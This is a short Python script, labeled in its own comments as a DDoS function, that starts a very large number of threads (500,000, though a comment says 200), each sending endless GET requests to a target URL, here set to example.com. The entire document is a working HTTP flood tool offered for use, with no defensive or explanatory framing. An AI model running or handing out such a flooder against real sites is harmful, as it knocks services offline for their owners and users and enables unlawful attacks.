import threading  
import requests  

#target url
target_url = "https://example.com"  

# ddos funcation
def attack():  
    while True:  
        try:  
            response = requests.get(target_url)  
            print(f"Sent Request: {response.status_code}")  
        except Exception as e:  
            print(f"Error: {e}")  

# launch atack
threads = []  
for i in range(500000):  # 200 threads
    thread = threading.Thread(target=attack)  
    thread.start()  
    threads.append(thread)  

for thread in threads:  
    thread.join()  
